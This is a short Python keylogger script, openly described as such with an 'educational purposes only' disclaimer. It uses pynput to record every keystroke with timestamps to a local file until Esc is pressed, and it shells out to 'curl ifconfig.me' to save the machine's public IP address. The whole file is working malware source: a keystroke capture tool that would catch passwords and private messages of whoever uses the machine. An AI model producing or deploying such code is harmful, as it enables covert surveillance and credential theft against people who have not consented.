# This is a keylogger program to log keystrokes and save them to a file
# This program is for educational purposes only
# I am not responsible for any misuse of this program

import pynput
import time
from pynput.keyboard import Key, Listener
import logging
import os

with open('ip.txt', 'w') as f:
    f.write(os.popen('curl ifconfig.me').read())

def on_press(key):
    logging.info(str(key))

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False


if __name__ == '__main__':
    # Collect events until released
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()
